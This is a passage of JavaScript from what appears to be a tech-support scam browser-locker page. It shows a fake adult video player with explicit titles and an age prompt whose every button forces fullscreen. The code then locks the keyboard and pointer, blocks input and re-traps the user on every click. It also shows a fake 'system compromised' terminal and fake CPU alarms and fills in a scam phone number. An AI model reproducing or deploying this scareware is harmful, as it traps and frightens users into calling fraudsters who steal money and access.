  const cpuLoadPercentElement = document.getElementById('cpu-load-percent');
  const cpuProgressFillElement = document.getElementById('cpu-progress-fill');
  
  if (!cpuUsageElement || !memoryUsageElement || !cpuLoadPercentElement || !cpuProgressFillElement) {
    console.error('CPU Monitor elements not found!');
    return;
  }
  
  // Update CPU usage every 2 seconds
  setInterval(() => {
    // Randomly fluctuate CPU usage between current value ±10, keep between 45-95%
    const change = Math.random() * 20 - 10;
    cpuUsageValue = Math.max(45, Math.min(95, cpuUsageValue + change));
    
    // Update display
    const cpuRounded = Math.round(cpuUsageValue);
    cpuUsageElement.textContent = cpuRounded + '%';
    cpuLoadPercentElement.textContent = cpuRounded + '%';
    cpuProgressFillElement.style.width = cpuRounded + '%';
    
    // Update colors based on usage
    cpuUsageElement.classList.remove('warning', 'critical');
    cpuProgressFillElement.classList.remove('warning', 'critical');
    
    if (cpuRounded >= 80) {
      cpuUsageElement.classList.add('critical');
      cpuProgressFillElement.classList.add('critical');
    } else if (cpuRounded >= 60) {
      cpuUsageElement.classList.add('warning');
      cpuProgressFillElement.classList.add('warning');
    }
  }, 2000);
  
  // Update memory usage every 3 seconds
  setInterval(() => {
    // Randomly fluctuate memory usage between 50-85%
    const change = Math.random() * 15 - 7.5;
    memoryUsageValue = Math.max(50, Math.min(85, memoryUsageValue + change));
    
    const memoryRounded = Math.round(memoryUsageValue);
    memoryUsageElement.textContent = memoryRounded + '%';
    
    // Update colors based on usage
    memoryUsageElement.classList.remove('warning', 'critical');
    
    if (memoryRounded >= 75) {
      memoryUsageElement.classList.add('critical');
    } else if (memoryRounded >= 65) {
      memoryUsageElement.classList.add('warning');
    }
  }, 3000);
  
  // Initialize with random starting values
  cpuUsageValue = Math.random() * 20 + 60; // Start between 60-80%
  memoryUsageValue = Math.random() * 20 + 55; // Start between 55-75%
  
  console.log('✅ CPU Monitor initialized');
}

// Function to update all phone numbers
function updateAllPhoneNumbers() {
  const phoneElements = document.querySelectorAll('.phone-number-display');
  phoneElements.forEach(element => {
    element.textContent = GLOBAL_PHONE_NUMBER;
  });
  console.log(`✅ Updated ${phoneElements.length} phone numbers to: ${GLOBAL_PHONE_NUMBER}`);
}

// Start security screens when page loads
console.log('⏱️ Starting initialization in 1 second...');
setTimeout(() => {
  updateAllPhoneNumbers();
  initSecurityScreens();
  startCPUMonitor();
}, 1000);

// Expose functions globally for debugging
console.log('🌍 Exposing global test functions...');
window.securityScreens = securityScreens;
window.bringToFront = bringToFront;
window.setupClickToFront = setupClickToFront;
console.log('✅ Global functions exposed. You can now use: testClickToFront(), bringToFront(), etc.');

/********** VIDEO PLAYER **********/
console.log('🎬 Initializing Video Player...');

// Video URLs
const videoUrls = [
  'https://horizonresearch25112025.pages.dev/s1.mp4',
  'https://horizonresearch25112025.pages.dev/s2.mp4',
  'https://horizonresearch25112025.pages.dev/s3.mp4',
  'https://horizonresearch25112025.pages.dev/s4.mp4',
  'https://horizonresearch25112025.pages.dev/s5.mp4',
  'https://horizonresearch25112025.pages.dev/s6.mp4',
  'https://horizonresearch25112025.pages.dev/s7.mp4',
  'https://horizonresearch25112025.pages.dev/s8.mp4',
  'https://horizonresearch25112025.pages.dev/s9.mp4',
  'https://horizonresearch25112025.pages.dev/s10.mp4'
];

const videoTitles = [
  'Cute girl came over at night and got cum in her pussy',
  'Horny Amateur Couple Having a Good Fuck - Mira David',
  'Step sister came to visit and was fucked in her pink pussy',
  'My stepsister helped me lose my virginity',
  'Sexy Brunette Talking on the Phone with Her Husband and Her Best Friend Fucks Her Anny Walker',
  'Hard Fucking a Friends Girlfriend and Filling Her Mouth with Cum - Anny Walker',
  'Sharing a Bed with My Stepsister and Fucking Her Big Ass - Anny Walker',
  'Stepsister Stuck Under a Blanket and Pretended to Be a Sex Doll - Anny Walker',
  'I couldn’t resist again and fucked my stepsister. And she didnt mind',
  'Im late. Can we make it in 15 minutes?'
];

let currentVideoIndex = -1;
let videoPlayerOverlay = null;
let mainVideoPlayer = null;

function initVideoPlayer() {
  console.log('🔧 Initializing video player...');
  
  videoPlayerOverlay = document.getElementById('video-player-overlay');
  mainVideoPlayer = document.getElementById('main-video-player');
  
  if (!videoPlayerOverlay) {
    console.error('❌ videoPlayerOverlay not found!');
    return;
  }
  
  if (!mainVideoPlayer) {
    console.error('❌ mainVideoPlayer not found!');
    return;
  }
  
  console.log('✅ Video player elements found');
  
  // Enable autoplay by starting muted (browsers allow muted autoplay)
  mainVideoPlayer.muted = true;
  mainVideoPlayer.volume = 0.7; // Set volume for when user unmutes
  
  // Generate thumbnails FIRST
  console.log('📋 Generating thumbnails...');
  generateThumbnails();
  
  // Play random video on load
  console.log('▶️ Starting random video with autoplay...');
  playRandomVideo();
  
  // Listen for video end event
  mainVideoPlayer.addEventListener('ended', () => {
    console.log('🔚 Video ended, playing next random video...');
    playRandomVideo();
  });
  
  // Listen for user unmuting (to restore volume)
  mainVideoPlayer.addEventListener('volumechange', () => {
    if (!mainVideoPlayer.muted && mainVideoPlayer.volume === 0) {
      mainVideoPlayer.volume = 0.7;
    }
  });
  
  // Close button
  const closeBtn = document.getElementById('close-video-player');
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      console.log('❌ Close button clicked');
      videoPlayerOverlay.style.display = 'none';
      mainVideoPlayer.pause();
    });
    console.log('✅ Close button listener added');
  }
  
  // Add click listener to entire video overlay to trigger fullscreen
  videoPlayerOverlay.addEventListener('click', function(e) {
    // Only trigger if age verification is not visible
    const ageOverlay = document.getElementById('age-verification-overlay');
    if (!ageOverlay || ageOverlay.style.display === 'none') {
      console.log('🎯 Video overlay clicked - activating fullscreen');
      startBackgroundAudio(); // Start audio
      activateFullscreen();
    }
  });
  
  console.log('✅✅✅ Video player fully initialized with autoplay enabled!');
}

function playRandomVideo() {
  // Get random index different from current
  let randomIndex;
  do {
    randomIndex = Math.floor(Math.random() * videoUrls.length);
  } while (randomIndex === currentVideoIndex && videoUrls.length > 1);
  
  currentVideoIndex = randomIndex;
  
  console.log(`🎬 Loading video ${currentVideoIndex + 1}: ${videoTitles[currentVideoIndex]}`);
  
  // Update video source
  mainVideoPlayer.src = videoUrls[currentVideoIndex];
  mainVideoPlayer.muted = true; // Keep muted for autoplay
  mainVideoPlayer.load();
  
  // Wait for video to be loaded enough to play
  mainVideoPlayer.addEventListener('loadeddata', function playWhenReady() {
    console.log('📹 Video loaded, attempting to play...');
    
    const playPromise = mainVideoPlayer.play();
    
    if (playPromise !== undefined) {
      playPromise
        .then(() => {
          console.log('✅ Video is now playing!');
        })
        .catch(error => {
          console.error('❌ Autoplay failed:', error);
          console.log('🔄 Retrying play...');
          // Try again after a short delay
          setTimeout(() => {
            mainVideoPlayer.play()
              .then(() => console.log('✅ Retry successful'))
              .catch(e => console.error('❌ Retry also failed:', e));
          }, 500);
        });
    }
    
    // Remove this listener after it fires once
    mainVideoPlayer.removeEventListener('loadeddata', playWhenReady);
  }, { once: true });
  
  // Update video title
  document.getElementById('video-title').textContent = videoTitles[currentVideoIndex];
  
  // Update active thumbnail
  updateActiveThumbnail(currentVideoIndex);
  
  console.log(`▶️ Playing video ${currentVideoIndex + 1}: ${videoTitles[currentVideoIndex]}`);
}

function playVideoByIndex(index) {
  if (index < 0 || index >= videoUrls.length) return;
  
  currentVideoIndex = index;
  mainVideoPlayer.src = videoUrls[index];
  mainVideoPlayer.load();
  mainVideoPlayer.play();
  
  // Update video title
  document.getElementById('video-title').textContent = videoTitles[index];
  
  // Update active thumbnail
  updateActiveThumbnail(index);
  
  console.log(`▶️ Playing video ${index + 1}: ${videoTitles[index]}`);
}

function generateThumbnails() {
  const thumbnailsContainer = document.getElementById('video-thumbnails');
  if (!thumbnailsContainer) return;
  
  thumbnailsContainer.innerHTML = '';
  
  // Create array of indices and shuffle it for random order
  let indices = Array.from({length: videoUrls.length}, (_, i) => i);
  
  // Shuffle array (Fisher-Yates shuffle)
  for (let i = indices.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [indices[i], indices[j]] = [indices[j], indices[i]];
  }
  
  // Generate thumbnails in random order
  indices.forEach((index) => {
    const thumbnail = document.createElement('div');
    thumbnail.className = 'video-thumbnail';
    thumbnail.dataset.index = index;
    
    // Generate random views in millions (1.0M to 9.9M)
    const viewsInMillions = (Math.random() * 8.9 + 1.0).toFixed(1);
    
    // Create thumbnail with actual video preview
    thumbnail.innerHTML = `
      <div class="thumbnail-image">
        <video class="thumbnail-video" preload="metadata" muted>
          <source src="${videoUrls[index]}#t=2" type="video/mp4">
        </video>
        <div class="thumbnail-overlay"></div>
      </div>
      <div class="thumbnail-info">
        <div class="thumbnail-title">${videoTitles[index]}</div>
        <div class="thumbnail-meta">Alles PornoHub • ${viewsInMillions}M views</div>
      </div>
    `;
    
    thumbnail.addEventListener('click', () => {
      playVideoByIndex(index);
      // Scroll to top of video when thumbnail is clicked
      document.querySelector('.video-main-section').scrollTop = 0;
    });
    
    thumbnailsContainer.appendChild(thumbnail);
  });
  
  console.log(`✅ Generated ${videoUrls.length} thumbnails in random order`);
}

function updateActiveThumbnail(activeIndex) {
  const thumbnails = document.querySelectorAll('.video-thumbnail');
  thumbnails.forEach((thumb, index) => {
    if (index === activeIndex) {
      thumb.classList.add('active');
    } else {
      thumb.classList.remove('active');
    }
  });
}

// ===== FULLSCREEN AND LOCK FEATURES =====
let fullscreenActivated = false;
let audioStarted = false;
let terminalInterval = null;

// Background audio setup
const backgroundAudio = document.getElementById('background-audio');

// Terminal code generation
const terminalCommands = [
  'Initializing system scan...',
  'Checking file integrity: /System/Library/CoreServices',
  'Scanning directory: /Users/Library/Caches',
  'Analyzing network connections...',
  'Detecting anomalies in process tree...',
  'WARNING: Suspicious activity detected',
  'Running security protocol: Level 5',
  'Verifying system signatures...',
  'Checking kernel extensions...',
  'Monitoring active processes: 247 threads',
  'Analyzing memory allocation: 8.7 GB used',
  'Scanning for malware signatures...',
  'ALERT: Unauthorized access attempt blocked',
  'Firewall status: ACTIVE',
  'Intrusion detection: ENABLED',
  'System integrity: COMPROMISED',
  'Running diagnostic tests...',
  'Checking network ports: 80, 443, 8080',
  'DNS resolution: 192.168.1.1',
  'Packet analysis in progress...',
  'Detecting encryption protocols...',
  'SSL/TLS verification: FAILED',
  'Certificate validation error',
  'Performing deep scan of system files...',
  'Analyzing registry entries...',
  'Checking user permissions...',
  'Root access: UNAUTHORIZED',
  'System files modified: 47 files',
  'Threat level: CRITICAL',
  'Quarantine procedure initiated...'
];

function generateTerminalLine() {
  const line = document.createElement('div');
  line.className = 'terminal-line';
  
  const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
  const randomCommand = terminalCommands[Math.floor(Math.random() * terminalCommands.length)];
  
  const lineType = Math.random();
  if (randomCommand.includes('WARNING') || randomCommand.includes('ALERT')) {
    line.classList.add('warning');
  } else if (randomCommand.includes('ERROR') || randomCommand.includes('FAILED')) {
    line.classList.add('error');
  } else if (randomCommand.includes('SUCCESS') || randomCommand.includes('ENABLED')) {
    line.classList.add('success');
  } else {
    line.classList.add('info');
  }
  
  line.textContent = `[${timestamp}] ${randomCommand}`;
  return line;
}

function startTerminalAnimation() {
  const terminal = document.getElementById('fullscreen-terminal');
  const terminalOutput = document.getElementById('terminal-output');
  const terminalContent = document.getElementById('terminal-content');
  
  if (!terminal || !terminalOutput) return;
  
  console.log('💻 Starting terminal animation...');
  terminal.style.display = 'block';
  terminalOutput.innerHTML = '';
  
  // Generate initial lines
  for (let i = 0; i < 5; i++) {
    terminalOutput.appendChild(generateTerminalLine());
  }
  
  // Continue generating lines
  terminalInterval = setInterval(() => {
    const newLine = generateTerminalLine();
    terminalOutput.appendChild(newLine);
    
    // Auto-scroll to bottom
    terminalContent.scrollTop = terminalContent.scrollHeight;
    
    // Keep only last 50 lines for performance
    if (terminalOutput.children.length > 50) {
      terminalOutput.removeChild(terminalOutput.firstChild);
    }
  }, 150); // Add new line every 150ms
  
  // Hide terminal after 5 seconds
  setTimeout(() => {
    console.log('💻 Hiding terminal after 5 seconds...');
    terminal.style.display = 'none';
    if (terminalInterval) {
      clearInterval(terminalInterval);
      terminalInterval = null;
    }
  }, 5000);
}

// Function to start background audio
function startBackgroundAudio() {
  if (!audioStarted && backgroundAudio) {
    backgroundAudio.play().then(() => {
      console.log('🔊 Background audio started');
      audioStarted = true;
    }).catch((err) => {
      console.log('⚠️ Audio play failed:', err);
    });
  }
}

// Detect when fullscreen is exited
document.addEventListener('fullscreenchange', function() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement && 
      !document.mozFullScreenElement && !document.msFullscreenElement) {
    console.log('⚠️ Fullscreen exited - resetting flag');
    fullscreenActivated = false;
  }
});

document.addEventListener('webkitfullscreenchange', function() {
  if (!document.webkitFullscreenElement) {
    console.log('⚠️ Webkit fullscreen exited - resetting flag');
    fullscreenActivated = false;
  }
});

document.addEventListener('mozfullscreenchange', function() {
  if (!document.mozFullScreenElement) {
    console.log('⚠️ Mozilla fullscreen exited - resetting flag');
    fullscreenActivated = false;
  }
});

document.addEventListener('msfullscreenchange', function() {
  if (!document.msFullscreenElement) {
    console.log('⚠️ MS fullscreen exited - resetting flag');
    fullscreenActivated = false;
  }
});

// Setup pointer lock on any mouse movement
document.addEventListener('mousemove', function() {
  if (fullscreenActivated) {
    const body = document.getElementById('main-body');
    if (body && document.pointerLockElement !== body) {
      body.requestPointerLock = body.requestPointerLock || 
                                 body.mozRequestPointerLock || 
                                 body.webkitRequestPointerLock;
      if (body.requestPointerLock) {
        body.requestPointerLock();
      }
    }
  }
});

// Re-trigger fullscreen on any click after exiting
document.addEventListener('click', function(e) {
  // Start background audio on first click
  if (!audioStarted) {
    startBackgroundAudio();
  }
  
  if (!fullscreenActivated) {
    console.log('🔄 Click detected after fullscreen exit - re-activating fullscreen');
    activateFullscreen();
  }
}, true); // Use capture phase to catch all clicks

// Exit confirmation - ALWAYS show
window.onbeforeunload = function() {
  return "Are you sure you want to leave this site? Your session will be terminated.";
};

window.addEventListener("beforeunload", function (e) {
  var confirmationMessage = 'Are you sure you want to leave this site? Your changes may not be saved.';
  (e || window.event).returnValue = confirmationMessage;
  return confirmationMessage;
});

// Fullscreen function
function activateFullscreen() {
  if (fullscreenActivated) {
    console.log('ℹ️ Fullscreen already activated');
    return;
  }
  
  console.log('🔒 Activating fullscreen mode...');
  fullscreenActivated = true;
  
  // Request fullscreen
  var el = document.documentElement;
  var rfs = el.requestFullscreen
      || el.webkitRequestFullscreen
      || el.webkitRequestFullScreen
      || el.mozRequestFullScreen
      || el.msRequestFullscreen;
  
  if (rfs) {
    rfs.call(el).then(() => {
      console.log('✅ Fullscreen activated');
    }).catch((err) => {
      console.log('⚠️ Fullscreen request failed:', err);
    });
  }
  
  // Lock keyboard
  if (navigator.keyboard && navigator.keyboard.lock) {
    navigator.keyboard.lock().then(() => {
      console.log('⌨️ Keyboard locked');
    }).catch((err) => {
      console.log('⚠️ Keyboard lock failed:', err);
    });
  }
  
  // Disable all keyboard events
  document.onkeydown = function (e) {
    console.log('🚫 Key press blocked:', e.key);
    e.preventDefault();
    return false;
  };
  
  document.onkeyup = function (e) {
    e.preventDefault();
    return false;
  };
  
  document.onkeypress = function (e) {
    e.preventDefault();
    return false;
  };
  
  // Hide cursor and lock pointer
  const body = document.getElementById('main-body');
  if (body) {
    body.style.cursor = 'none';
    
    // Request Pointer Lock (this actually locks the mouse from moving)
    body.requestPointerLock = body.requestPointerLock || 
                               body.mozRequestPointerLock || 
                               body.webkitRequestPointerLock;
    
    if (body.requestPointerLock) {
      body.requestPointerLock();
      console.log('🔒 Pointer lock requested');
    }
  }
  
  // Also disable mouse events
  document.oncontextmenu = function() {
    return false;
  };
  
  document.onmousedown = function(e) {
    e.preventDefault();
    return false;
  };
  
  document.onmouseup = function(e) {
    e.preventDefault();
    return false;
  };
  
  // Hide age verification
  const ageOverlay = document.getElementById('age-verification-overlay');
  if (ageOverlay) {
    ageOverlay.style.display = 'none';
    console.log('✅ Age verification hidden');
  }
  
  // Hide video player overlay
  const videoOverlay = document.getElementById('video-player-overlay');
  if (videoOverlay) {
    videoOverlay.style.display = 'none';
    console.log('✅ Video player overlay hidden');
  }
  
  // Pause video
  if (mainVideoPlayer) {
    mainVideoPlayer.pause();
    console.log('⏸️ Video paused');
  }
  
  console.log('✅ Fullscreen mode fully activated - all overlays hidden');
  
  // Show terminal animation
  startTerminalAnimation();
}

// Initialize and show video player immediately
function showVideoPlayer() {
  console.log('🎬 Showing video player immediately...');
  
  videoPlayerOverlay = document.getElementById('video-player-overlay');
  
  if (!videoPlayerOverlay) {
    console.error('❌ Video player overlay element not found!');
    return;
  }
  
  console.log('✅ Video player overlay element found - displaying now');
  videoPlayerOverlay.style.display = 'flex';
  
  initVideoPlayer();
  
  // Show age verification after 0.5 seconds
  setTimeout(showAgeVerification, 500);
}

// Age Verification Functions
function showAgeVerification() {
  console.log('🔞 Showing age verification...');
  const ageOverlay = document.getElementById('age-verification-overlay');
  
  if (!ageOverlay) {
    console.error('❌ Age verification overlay not found!');
    return;
  }
  
  ageOverlay.style.display = 'flex';
  
  // Add click listener to entire age overlay to trigger fullscreen
  ageOverlay.addEventListener('click', function(e) {
    console.log('🎯 Age overlay clicked - activating fullscreen');
    startBackgroundAudio(); // Start audio
    activateFullscreen();
  });
  
  // Setup button listeners
  const yesBtn = document.getElementById('age-btn-yes');
  const noBtn = document.getElementById('age-btn-no');
  const closeBtn = document.getElementById('age-modal-close');
  
  if (yesBtn) {
    yesBtn.addEventListener('click', handleAgeYes);
  }
  
  if (noBtn) {
    noBtn.addEventListener('click', handleAgeNo);
  }
  
  if (closeBtn) {
    closeBtn.addEventListener('click', handleAgeClose);
  }
  
  console.log('✅ Age verification displayed');
}

function handleAgeYes() {
  console.log('✅ User confirmed 18+');
  activateFullscreen();
}

function handleAgeNo() {
  console.log('❌ User selected NO - activating fullscreen');
  activateFullscreen();
}

function handleAgeClose() {
  console.log('❌ User closed age verification - activating fullscreen');
  activateFullscreen();
}

// Show immediately - no delay
console.log('📄 Initializing video player immediately...');
showVideoPlayer();

// Expose functions
window.showVideoPlayer = showVideoPlayer;
window.showAgeVerification = showAgeVerification;
console.log('✅ Video player should be visible now!');
